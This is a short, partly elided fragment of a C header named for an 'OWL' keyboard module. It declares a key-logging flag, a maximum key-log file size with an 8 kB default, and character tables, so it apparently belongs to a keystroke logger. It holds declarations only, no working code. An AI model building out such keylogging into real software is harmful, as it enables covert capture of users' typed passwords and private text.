 ...
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#ifndef __OWL_KEYBOARD_H__
#define __OWL_KEYBOARD_H__
...
extern bool bCtrlKeyLog;
extern unsigned long ulMaxKLFSize;
extern const char szShfChars[];
extern const char szKeys[];

#define DEF_KLF_SIZE	(4096 * 2)	/*8 kBytes*/
